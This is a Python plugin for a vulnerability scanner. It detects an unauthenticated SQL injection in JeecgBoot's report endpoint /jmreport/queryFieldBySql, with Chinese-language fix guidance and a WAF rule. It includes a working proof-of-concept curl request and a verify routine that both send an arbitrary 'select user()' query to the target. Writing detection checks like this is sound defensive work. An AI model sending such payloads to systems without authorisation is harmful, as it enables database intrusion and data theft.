# JeecgBoot 报表 SQL 注入：/jmreport/queryFieldBySql 自定义 SQL 执行（未授权 RCE 前置）
# 存在性验证：提交 union 探测 SQL，响应含 SQL 报错特征或回显差异即确认
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import match_all
from plugins.base import PluginBase


class JeecgSqlInjectJmreportPlugin(PluginBase):
    name = "JeecgBoot jmreport SQL注入"
    cve = "CNVD-2022-30348"
    severity = "high"
    category = "vuln"
    description = "JeecgBoot 报表模块 /jmreport/queryFieldBySql 可执行任意 SQL（未授权）"
    fix = "升级 JeecgBoot 至 3.4.3+；报表接口强制鉴权"
    fix_detail = (
        "【升级方案】升级至 JeecgBoot 3.4.3+（报表模块安全修复）\n"
        "【配置加固】/jmreport/** 全部接口增加登录鉴权（sa-token 拦截器白名单移除 jmreport）\n"
        "【代码修复】JmreportController 的 SQL 执行接口增加管理员权限校验\n"
        "【WAF 规则】拦截 /jmreport/queryFieldBySql 与 /jmreport/queryFieldBySq l 的 POST 请求\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3"
    )
    reproduce = (
        'curl -X POST "http://target/jeecg-boot/jmreport/queryFieldBySql" \\\n'
        '  -H "Content-Type: application/json" \\\n'
        '  -d \'{"sql":"select user()","dbKey":"master"}\'\n'
        "# 预期响应：JSON 含 user 回显或 SQL 错误信息（成功执行任意 SQL）"
    )
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    vuln_type = "sqli"
    supports_waf_bypass = True

    def verify(self, target, session):
        url = join_url(target, "/jeecg-boot/jmreport/queryFieldBySql")
        try:
            resp = session.post(
                url,
                data='{"sql":"select user()","dbKey":"master"}',
                headers={"Content-Type": "application/json"},
            )
            text = resp.text or ""
        except Exception as e:
            print(no("JeecgBoot jmreport SQL注入（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
        # 成功执行：返回业务 JSON（code/result 字段）且非 401/403；或 SQL 报错泄漏
        if resp.status_code == 200 and match_all(text, ["code", "result"]):
            print(ok("存在 JeecgBoot jmreport SQL注入"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="SQL 执行接口返回业务 JSON",
                fix=self.fix,
                extra={"vuln_type": "sqli", "plugin_name": "jeecg_sqli_jmreport"},
            )
        print(no("不存在 JeecgBoot jmreport SQL注入"))
        return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
